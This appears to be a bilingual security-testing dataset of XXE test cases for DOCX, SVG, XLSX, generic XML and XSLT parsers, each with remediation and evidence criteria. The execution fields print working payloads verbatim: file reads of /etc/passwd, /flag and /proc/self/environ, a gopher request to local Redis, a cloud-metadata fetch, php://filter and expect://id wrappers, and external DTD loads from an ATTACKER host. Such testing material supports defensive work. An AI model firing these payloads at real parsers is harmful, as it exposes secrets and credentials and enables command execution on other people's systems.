description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性要求 DOCX worker 的 marker 文件读取或 token 化 HTTP 首包与同一任务及展开输出关联；仅 URI、错误或 DNS 不是实体展开。
analysis.en: A positive correlates a DOCX-worker marker-file read or tokenized HTTP first packet with the same job and expanded output; a URI, error, or DNS alone is not entity expansion.

name.zh: DOCX Gopher 实体请求边界

description.zh: 隔离 DOCX 外部实体中的 gopher URI，验证解析器是否把非 HTTP scheme 交给网络 resolver。
description.en: Isolates the gopher URI in a DOCX external entity to test whether the parser delegates a non-HTTP scheme to a network resolver.

title.zh: DOCX Gopher 实体请求边界

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO%0d%0a">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>

description.zh: 不要发送原始 Redis INFO 序列；实际测试将 URI 替换为无协议副作用的自有 resolver marker。
description.en: Do not send the source Redis INFO sequence; replace the URI with an owned resolver marker that has no protocol side effect.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只使用本条执行区命令，所有真实目标替换为隔离 marker。
description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性只是在受控 resolver 收到来自 DOCX worker 的当前任务 token；编码字符串、DNS 或连接失败均不足以证明协议请求。
analysis.en: A positive is limited to the controlled resolver receiving the current job token from the DOCX worker; encoded text, DNS, or a failed connection does not prove a protocol request.

name.zh: DOCX PHP Filter 实体读取边界

description.zh: 隔离 php://filter 外部实体，验证基于 PHP/libxml 的 DOCX 处理链是否启用 stream wrapper。
description.en: Isolates php://filter external entities to test whether a PHP/libxml DOCX pipeline enables stream wrappers.

subCategory.zh: DOCX PHP Stream Wrapper 实体

title.zh: DOCX PHP Filter 实体读取边界

execution.command:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>

description.zh: 不得读取源路径；在 PHP 隔离夹具中把 resource 改为只含随机值的 marker 文件。
description.en: Do not read source paths; in an isolated PHP fixture change resource to a marker file containing only a random value.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只使用本条执行区命令，所有真实目标替换为隔离 marker。
description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性要求 PHP DOCX worker 读取 marker，且实体展开值与任务随机值一致；wrapper 文本被接受或 base64 字样出现不是读取。
analysis.en: A positive requires the PHP DOCX worker to read the marker and expand the job nonce; accepted wrapper text or the word base64 is not a read.

name.zh: DOCX PHP Expect 实体执行边界

description.zh: 隔离 expect:// 外部实体，验证 PHP expect 扩展是否意外暴露给 DOCX XML resolver。
description.en: Isolates an expect:// external entity to test whether the PHP expect extension is accidentally exposed to the DOCX XML resolver.

title.zh: DOCX PHP Expect 实体执行边界

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>

description.zh: 绝不运行原始 id；验证仅使用已注册、无子进程的测试 wrapper 返回随机 marker。
description.en: Never run the source id command; validate only with a registered test wrapper that returns a random marker without spawning a process.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只使用本条执行区命令，所有真实目标替换为隔离 marker。
description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性要求无副作用测试 wrapper 在目标 PHP worker 内被调用并返回当前 marker；命令文本或不支持 scheme 错误不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to run inside the target PHP worker and return the current marker; command text or an unsupported-scheme error does not prove execution.

name.zh: DOCX 外部参数实体 DTD 获取

description.zh: 隔离参数实体引用远程 DTD 的 OOB 变体，验证 word/document.xml 解析器是否获取外部子集。
description.en: Isolates the OOB parameter-entity variant that references a remote DTD to test whether the word/document.xml parser retrieves an external subset.

title.zh: DOCX 外部参数实体 DTD 获取

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">%xxe;]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>test</w:t></w:r></w:p></w:body></w:document>

description.zh: 把 ATTACKER 改为只返回空合法 DTD 的单次 token 端点，禁止在 DTD 中定义二次实体或回连。
description.en: Replace ATTACKER with a single-use token endpoint returning an empty valid DTD and define no secondary entities or callbacks in it.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只使用本条执行区命令，所有真实目标替换为隔离 marker。
description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性要求 token 化 DTD 请求由处理该 DOCX 的 worker 发出；ATTACKER 字符串、DNS 或客户端请求不属于服务端参数实体证据。
analysis.en: A positive requires the tokenized DTD request to originate from the worker processing this DOCX; ATTACKER text, DNS, or a client request is not server-side parameter-entity evidence.

name.zh: DOCX XInclude 文件读取边界

description.zh: 隔离不依赖 DOCTYPE 的 xi:include 变体，验证 DOCX XML 处理链是否启用 XInclude 文本加载。
description.en: Isolates the xi:include variant that does not use a DOCTYPE to test whether the DOCX XML pipeline enables XInclude text loading.

title.zh: DOCX XInclude 文件读取边界

description.zh: 将 file URI 改为工作目录内只含随机值的 marker.txt，并确保处理器不能访问宿主路径。
description.en: Change the file URI to marker.txt containing only a random value in the working directory and ensure the processor cannot access host paths.

title.zh: 确认 DOCX 解析组件

description.zh: 记录处理器、任务入口和无外部资源基线。
description.en: Record the processor, job entry, and no-external-resource baseline.

title.en: Rewrite targets and submit one mechanism

description.en: Use only this entry command and replace every real destination with an isolated marker.

title.zh: 关联解析证据

description.zh: 把 worker 事件、任务 token 与派生输出关联，排除客户端行为。
description.en: Correlate worker events, job token, and derived output and exclude client behavior.

title.zh: 关闭外部能力并回归

description.zh: 修复后普通 DOCX 保持可用，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve ordinary DOCX and reject this mechanism before marker access.

analysis.zh: 阳性要求 XInclude 处理器读取 marker 且值进入对应文档节点；namespace 被保留、href 回显或 open 失败不是内容读取。
analysis.en: A positive requires the XInclude processor to read the marker and place its value in the expected document node; a retained namespace, reflected href, or failed open is not a content read.

name.zh: SVG 外部通用实体资源解析

description.zh: 归并 file 与 HTTP SYSTEM 标识符变体，验证 SVG text 节点中的外部通用实体是否由图片 worker 展开。
description.en: Groups file and HTTP SYSTEM-identifier variants to test whether an image worker expands external general entities in an SVG text node.

title.zh: SVG 外部通用实体资源解析

execution.command:
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 执行前把真实路径、回环和元数据地址改为 worker 沙箱 marker 或隔离 HTTP token，逐个变体运行。
description.en: Before execution, replace real paths, loopback, and metadata addresses with a worker-sandbox marker or isolated HTTP token and run variants separately.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。
description.en: Record the upload job, worker, version, and no-external-resource baseline.

title.zh: 改写目标并触发单一机制
title.en: Rewrite targets and trigger one mechanism

description.zh: 只提交本条执行区变体，并把真实目标替换为隔离 marker。
description.en: Submit only this execution variant and replace real destinations with isolated markers.

title.zh: 关联 Worker 与派生产物
title.en: Correlate the worker and derived artifact

description.zh: 匹配任务 token、解析器事件和缩略图或文本结果，排除客户端解析。
description.en: Match job token, parser events, and thumbnail or text output and exclude client parsing.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。
description.en: After remediation ordinary SVG still rasterizes and this mechanism fails before marker access.

analysis.zh: 阳性要求图片 worker 读取 marker 或发出 token 请求，并让展开值进入 SVG 模型、栅格结果或提取文本；源码或客户端显示不计。
analysis.en: A positive requires the image worker to read the marker or send the token request and place expanded data in the SVG model, raster output, or extracted text; source text or client rendering does not count.

name.zh: SVG Gopher 实体请求边界

description.zh: 隔离 SVG 外部实体中的 gopher URI，验证图片解析器是否委托非 HTTP scheme。
description.en: Isolates the gopher URI in an SVG external entity to test whether the image parser delegates a non-HTTP scheme.

title.zh: SVG Gopher 实体请求边界

execution.command: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO%0d%0a">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 不要发送原始 Redis INFO 数据；将 URI 替换为无协议副作用的单次 resolver marker。
description.en: Do not send the source Redis INFO data; replace the URI with a single-use resolver marker that has no protocol side effect.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。
description.en: Record the upload job, worker, version, and no-external-resource baseline.

title.zh: 改写目标并触发单一机制
title.en: Rewrite targets and trigger one mechanism

description.zh: 只提交本条执行区变体，并把真实目标替换为隔离 marker。
description.en: Submit only this execution variant and replace real destinations with isolated markers.

title.zh: 关联 Worker 与派生产物
title.en: Correlate the worker and derived artifact

description.zh: 匹配任务 token、解析器事件和缩略图或文本结果，排除客户端解析。
description.en: Match job token, parser events, and thumbnail or text output and exclude client parsing.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。
description.en: After remediation ordinary SVG still rasterizes and this mechanism fails before marker access.

analysis.zh: 阳性只是在受控 resolver 收到图片 worker 的当前任务 token；编码载荷、DNS、预览失败或客户端流量不是协议请求证据。
analysis.en: A positive is limited to the controlled resolver receiving the current job token from the image worker; encoded payload text, DNS, preview failure, or client traffic is not protocol-request evidence.

name.zh: SVG PHP Filter 实体读取边界

description.zh: 隔离 php://filter 实体，验证 PHP/libxml 图片处理链是否把 stream wrapper 暴露给 SVG 解析。
description.en: Isolates a php://filter entity to test whether a PHP/libxml image pipeline exposes stream wrappers during SVG parsing.

subCategory.zh: SVG PHP Stream Wrapper 实体

title.zh: SVG PHP Filter 实体读取边界

execution.command: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 不得读取原始系统路径；在隔离 PHP fixture 中把 resource 改为单行随机 marker。
description.en: Do not read the source system path; in an isolated PHP fixture change resource to a one-line random marker.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。
description.en: Record the upload job, worker, version, and no-external-resource baseline.

title.en: Rewrite targets and trigger one mechanism

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。

analysis.en: A positive requires the target PHP image worker to read the marker and place expanded data in a derived artifact; accepting wrapper text or showing base64 text is not a read.

name.zh: SVG PHP Expect 实体执行边界

description.zh: 隔离 expect:// 实体，验证 PHP expect 扩展是否意外暴露给 SVG XML resolver。
description.en: Isolates an expect:// entity to test whether the PHP expect extension is accidentally exposed to the SVG XML resolver.

title.zh: SVG PHP Expect 实体执行边界

execution.command: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "expect://id">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 绝不运行原始 id；只用无子进程测试 wrapper 返回当前任务 marker。
description.en: Never run the source id command; use only a no-child-process test wrapper that returns the current job marker.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。
description.en: Record the upload job, worker, version, and no-external-resource baseline.

title.en: Rewrite targets and trigger one mechanism

title.zh: 关闭外部解析并回归

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。

analysis.zh: 阳性要求无副作用测试 wrapper 在处理该 SVG 的 PHP worker 内被调用；命令文本、解析错误或 scheme 被识别不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to be invoked in the PHP worker processing this SVG; command text, parse errors, or scheme recognition does not prove execution.

name.zh: SVG 外部参数实体 DTD 获取

description.zh: 隔离远程参数实体变体，验证 SVG worker 是否获取外部 DTD。
description.en: Isolates the remote parameter-entity variant to test whether the SVG worker retrieves an external DTD.

title.zh: SVG 外部参数实体 DTD 获取

execution.command: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">%xxe;]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">test</text></svg>

description.zh: 将 ATTACKER 改为只返回空合法 DTD 的单次 token 端点，不定义二次实体。
description.en: Replace ATTACKER with a single-use token endpoint returning an empty valid DTD and define no secondary entity.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。

analysis.zh: 阳性要求 DTD token 请求由处理该上传的图片 worker 发出；DNS、客户端请求、任务失败或 ATTACKER 回显均不计。
analysis.en: A positive requires the DTD token request to originate from the image worker processing this upload; DNS, client requests, job failure, or reflected ATTACKER text does not count.

name.zh: SVG XInclude 文件读取边界

description.en: Isolates the xi:include text-loading variant to test whether the image pipeline enables XInclude without a DOCTYPE.

description.zh: 把 file URI 改为 worker 工作目录内只含随机值的 marker.txt。
description.en: Change the file URI to marker.txt containing only a random value in the worker working directory.

analysis.zh: 阳性要求图片 worker 读取 marker 且值进入对应 SVG text 节点或派生产物；namespace/href 存在或 open 失败不是内容读取。

name.zh: XLSX SharedStrings 外部通用实体

description.zh: 隔离 php://filter 变体，验证 PHP/libxml 表格导入链是否启用 stream wrapper。
description.en: Isolates the php://filter variant to test whether a PHP/libxml spreadsheet-import pipeline enables stream wrappers.

subCategory.zh: XLSX PHP Stream Wrapper 实体

title.zh: XLSX SharedStrings PHP Filter 实体

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&xxe;</t></si></sst>

description.zh: 不得读取源系统路径；在隔离 PHP fixture 中把 resource 改为随机 marker 文件。
description.en: Do not read the source system path; in an isolated PHP fixture change resource to a random marker file.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只运行本条执行区命令，并将真实目标替换为隔离 marker。
description.en: Run only this execution command and replace real destinations with isolated markers.

title.zh: 关联 Worker 与结果

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

analysis.zh: 阳性要求 PHP 导入 worker 读取 marker 且展开值进入共享字符串结果；wrapper 文本或 base64 关键字出现不证明读取。
analysis.en: A positive requires the PHP import worker to read the marker and place expanded data in the shared-string result; wrapper text or a base64 keyword does not prove a read.

name.zh: XLSX SharedStrings PHP Expect 实体

description.zh: 隔离 expect:// 变体，验证 PHP expect 扩展是否暴露给 SpreadsheetML resolver。
description.en: Isolates the expect:// variant to test whether the PHP expect extension is exposed to the SpreadsheetML resolver.

title.zh: XLSX SharedStrings PHP Expect 实体

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&xxe;</t></si></sst>

description.zh: 绝不运行原始 id；只用无子进程测试 wrapper 返回当前任务 marker。
description.en: Never run the source id command; use only a no-child-process test wrapper that returns the current job marker.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只运行本条执行区命令，并将真实目标替换为隔离 marker。
description.en: Run only this execution command and replace real destinations with isolated markers.

title.zh: 关联 Worker 与结果

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

analysis.zh: 阳性要求测试 wrapper 在处理该 XLSX 的 PHP worker 内被调用；命令文本、scheme 识别或导入错误不能证明执行。
analysis.en: A positive requires the test wrapper to run in the PHP worker processing this XLSX; command text, scheme recognition, or import errors do not prove execution.

name.zh: 通用 XML 外部资源实体

description.zh: 从 XLSX 集合中分离根元素为 x 的通用 XML file/HTTP 实体样例，避免把非 SpreadsheetML 输入归给工作簿部件。
description.en: Separates generic root-x XML file and HTTP entity samples from the XLSX set so non-SpreadsheetML input is not attributed to a workbook part.

subCategory.zh: 通用 XML 外部通用实体

title.zh: 通用 XML 外部资源实体

execution.command:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/">]><x>&xxe;</x>

description.zh: 按实际通用 XML 入口单独测试，并把 file/HTTP 目标改为 marker；不得打包成 XLSX。
description.en: Test only at an actual generic-XML entry and rewrite file and HTTP targets to markers; do not package these samples as XLSX.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只运行本条执行区命令，并将真实目标替换为隔离 marker。
description.en: Run only this execution command and replace real destinations with isolated markers.

title.zh: 关联 Worker 与结果

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

analysis.zh: 阳性必须归属于明确的通用 XML parser，并关联 marker 读取或 token 请求；XLSX worker 结果不能替代该入口证据。
analysis.en: A positive must belong to an identified generic XML parser and correlate a marker read or token request; an XLSX-worker result cannot substitute for this entry evidence.

name.zh: XLSX SharedStrings 外部 DTD 获取

description.zh: 隔离 sharedStrings.xml 的外部参数实体，验证 SpreadsheetML parser 是否获取远程 DTD。
description.en: Isolates the external parameter entity in sharedStrings.xml to test whether the SpreadsheetML parser retrieves a remote DTD.

title.zh: XLSX SharedStrings 外部 DTD 获取

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">%xxe;]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>test</t></si></sst>

description.zh: 将 ATTACKER 改为只返回空合法 DTD 的单次 token 端点，不定义二次实体。
description.en: Replace ATTACKER with a single-use token endpoint returning an empty valid DTD and define no secondary entity.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只运行本条执行区命令，并将真实目标替换为隔离 marker。
description.en: Run only this execution command and replace real destinations with isolated markers.

title.zh: 关联 Worker 与结果

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

title.zh: 关闭外部解析并回归

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

analysis.zh: 阳性要求 token 化 DTD 请求来自处理该 XLSX 的 worker；DNS、客户端请求、导入失败或 ATTACKER 回显均不计。
analysis.en: A positive requires the tokenized DTD request to originate from the worker processing this XLSX; DNS, client requests, import failure, or reflected ATTACKER text does not count.

retiredCommands.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY test "%xxe;">]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&test;</t></si></sst>

reason.zh: 该行在 DTD 内部子集中把参数实体引用嵌入同一标记声明，违反 XML 1.0 对内部子集中参数实体引用位置的限制；标准解析器在文档内容前即报错。
reason.en: This line embeds a parameter-entity reference inside a markup declaration in the internal DTD subset, violating XML 1.0 placement rules; conforming parsers reject it before document content.

name.zh: XSLT document() 文件读取边界

description.zh: 保留完整的五行 XSLT 1.0 样式表，验证服务端转换器是否允许 document() 解析外部文件资源。
description.en: Preserves the complete five-line XSLT 1.0 stylesheet to test whether a server-side transformer permits document() to resolve an external file resource.

prerequisites.zh: 用户可控完整样式表进入已识别的 XSLT 处理器，处理器版本、base URI、document() 和 URIResolver 策略已冻结。
prerequisites.en: A user-controlled complete stylesheet reaches an identified XSLT processor, with processor version, base URI, document(), and URIResolver policy frozen.

prerequisites.zh: 原 `/etc/passwd` 在运行前改为只含随机 XML marker 的沙箱文件，转换进程无其他宿主文件和网络权限。
prerequisites.en: Before execution, replace /etc/passwd with a sandbox XML marker containing only a random value and give the transformer no other host-file or network permission.

title.zh: 完整 document() 样式表

description.zh: 按来源保留完整结构；实际测试只把 document() 参数改为沙箱 marker.xml，不访问系统文件。
description.en: The complete source structure is preserved; during testing change only the document() argument to sandbox marker.xml and do not access a system file.

overview.zh: XSLT 1.0 document() 可通过处理器 URI resolver 加载外部 XML 文档。风险取决于样式表控制权、base URI、处理器安全模式和 resolver，而不是普通 value-of 本身。
overview.en: XSLT 1.0 document() can load an external XML document through the processor URI resolver. Risk depends on stylesheet control, base URI, secure-processing mode, and the resolver rather than value-of itself.

vulnerability.zh: 若应用执行不可信样式表且允许文件 URI 或相对路径越出资源根，转换输出可能包含渲染主机文件。路径出现在错误、函数被识别或 URI 打开失败均不等于内容读取。
vulnerability.en: If an application executes untrusted stylesheets and permits file URIs or relative paths outside an asset root, transform output may contain renderer-host files. A path in an error, recognized function, or failed URI open does not equal a content read.

exploitation.zh: 先以常量样式表建立无资源基线，再把参数改为合法 marker.xml 并转换固定源 XML。阳性要求 resolver/file 审计显示读取 marker，且随机值进入转换输出；使用不存在 marker 作阴性对照。
exploitation.en: Establish a no-resource baseline with a constant stylesheet, then point the argument to valid marker.xml and transform fixed source XML. A positive requires resolver or file audit to show the marker read and its random value in transform output, with a missing marker as negative control.

mitigation.zh: 只允许签名或版本控制的固定样式表，启用安全处理并用拒绝外部 URI 的 resolver；转换进程使用最小只读资源根、无网络和低权限身份。
mitigation.en: Allow only signed or version-controlled fixed stylesheets, enable secure processing, and use a resolver that rejects external URIs; run the transformer with a minimal read-only asset root, no network, and low privilege.

title.zh: 确认处理器与 Resolver

description.zh: 记录实现、版本、base URI、安全开关和常量转换基线。
description.en: Record implementation, version, base URI, security switches, and constant-transform baseline.

title.zh: 改写为 Marker 文档

description.zh: 只替换 document() 参数，在隔离转换任务中运行一次。
description.en: Replace only the document() argument and run once in an isolated transform job.

title.zh: 关联读取与输出

description.zh: 匹配 resolver、文件读取、任务 token 和转换结果中的随机值。
description.en: Match resolver, file read, job token, and random value in transform output.

title.zh: 拒绝外部 URI 并回归

description.zh: 修复后普通固定 XSLT 输出不变，marker 在打开前被拒绝。
description.en: After remediation fixed ordinary XSLT output is unchanged and the marker is rejected before open.

analysis.zh: 阳性必须同时有目标转换进程读取合法 marker.xml 和随机值进入输出。`select`、namespace URL、文件路径文本、解析成功或错误信息都是结构/诊断信号，不证明越界读取。
analysis.en: A positive requires both the target transformer reading valid marker.xml and its random value entering output. The select attribute, namespace URL, file-path text, parse success, or errors are structural or diagnostic signals and do not prove a boundary-crossing read.

opsecTips.zh: 只使用有效的小型 marker.xml，禁止系统文件、网络 URL、递归文档或大体积资源。
opsecTips.en: Use only a small valid marker.xml and prohibit system files, network URLs, recursive documents, or large resources.

opsecTips.zh: 一次性转换进程使用短超时和只读目录，完成后删除样式表、源 XML、marker、输出与 resolver 日志令牌。
opsecTips.en: Use a disposable transform process with a short timeout and read-only directory, then delete stylesheet, source XML, marker, output, and resolver-log tokens.

reason.zh: 该 value-of 位于 stylesheet 根元素之后，不属于任何 template；system() 既无命名空间也不是 XSLT 1.0 标准函数，不能作为独立可执行样式表。
reason.en: This value-of appears after the stylesheet root and outside every template; system() is unnamespaced and not an XSLT 1.0 standard function, so it is not an independently executable stylesheet.

reason.zh: 该 value-of 同样脱离 stylesheet/template，且未声明 php 命名空间或宿主扩展映射；标准 XSLT parser 会在调用前拒绝该片段。
reason.en: This value-of is likewise outside the stylesheet and template and declares no php namespace or host-extension mapping; a standard XSLT parser rejects the fragment before invocation.

name.zh: 通用 XML 本地文件实体

description.zh: 归并 Linux 与 Windows file URI 的最小 root 文档，验证通用 XML parser 的外部通用实体文件读取边界。
description.en: Groups minimal root documents with Linux and Windows file URIs to test external-general-entity file reads in a generic XML parser.

subCategory.zh: 通用 XML 本地实体

title.zh: 通用 XML 本地文件实体

execution.command:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>

description.zh: 执行前把两个系统路径按目标平台改为工作目录内不同随机 marker 文件。
description.en: Before execution, replace both system paths with distinct random marker files in the working directory for the target platform.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

